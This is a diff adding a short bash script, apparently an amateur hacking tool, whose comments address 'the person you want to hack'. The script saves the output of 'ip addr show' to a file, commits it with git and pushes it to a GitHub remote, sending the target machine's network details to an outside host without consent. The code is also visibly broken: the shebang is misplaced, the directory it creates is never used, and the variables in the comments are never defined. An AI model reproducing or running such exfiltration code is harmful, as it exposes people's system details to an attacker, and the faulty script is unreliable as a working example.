@@ -1,0 +1,25 @@
+trademark tm the cat
+---------------------
+# p = the person you want to hack
+# ps = the person you want to hack's username
+# repo_p = the person you want to hack's empty reposititory
+
+#! /usr/bin/bash
+
+cd /usr/sys
+
+mkdir ip_addr_get
+
+git init
+
+ip addr show >> ip_addr.txt
+
+git add ip_addr.txt
+
+git commit -m "The cat leaves his mark.. through his claws.."
+
+git branch -M main
+
+git remote add origin https://github.com/username/ip_addr_get
+
+git push -u origin main
